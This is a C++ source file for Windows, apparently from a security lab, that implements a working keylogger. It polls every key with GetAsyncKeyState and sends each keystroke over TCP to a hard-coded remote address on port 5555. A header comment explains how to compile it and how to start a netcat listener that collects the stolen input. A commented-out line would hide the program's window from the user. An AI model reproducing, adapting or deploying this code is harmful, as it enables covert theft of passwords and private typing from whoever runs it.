/*
Compilation instructions:

In order for the compiler to include the windows socket library, one more thing needs to be done.

In DevC++, go to "Tools", click "Compiler options" and in the bottom box type " -lws2_32"

USAGE:

install netcat:
https://eternallybored.org/misc/netcat/

nc.exe -lvp 5555 (or the port you specified) <- For Windows
nc -lvp 5555 (or the port you specified) <- For Linux


*/


#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the Ws2_32.lib library in order to use sockets (networking) */


#include <stdio.h> //standard input/output utilities
#include <winsock2.h> //networking utilities
#include <iostream> //standard input/output utilities

#include <stdlib.h> //standard input/output utilities
#include <string> //string utilities
#include <Windows.h> //Windows libraries

using namespace std;



int main (){
	//ShowWindow(GetConsoleWindow(), SW_HIDE); // hide this program window
	char KEY; //declary a variable for single key, of type char
	WSADATA WSAData; // declaration of Structure
	SOCKET server; // variable used to store the connection, of type SOCKET
	SOCKADDR_IN addr; //variable holding connection details - of SOCKADDR_IN  type
	WSAStartup(MAKEWORD(2, 0), &WSAData); // initialize usage of the winsock library (needed for opening a network connection) 
	server = socket(AF_INET, SOCK_STREAM, 0); //set up a TCP socket
	addr.sin_addr.s_addr = inet_addr("192.168.0.29"); /* specify the target of the network connection - replace the ip with your listening (tap0) ip address */
	addr.sin_family = AF_INET; /* set address family (AF) to AF_INET - this address family contains the IPv4 addresses to be used to communicateover TCP */
	addr.sin_port = htons(5555); //remote port - change it to your listening port
	connect(server, (SOCKADDR *)&addr, sizeof(addr)); /* connect to the previously set up target host/port */

	//collect pressed keys
	while (true) { //do this forever:
            Sleep(10); //pause (Sleep) for 10 miliseconds
            for (int KEY = 0x8; KEY < 0xFF; KEY++) /* check if this is a printable key (key codes are defined by Microsoft) */
            {
                if (GetAsyncKeyState(KEY) == -32767) { //if a key was pressed
                    char buffer[2]; //declare a variable that will hold the pressed key
                    buffer[0] = KEY; //insert the key into the variable
                    send(server, buffer, sizeof(buffer), 0);//send it over the network
                }
            } 
		}

	closesocket(server); //close the socket
	WSACleanup(); //clean up the Winsock library componets	
}
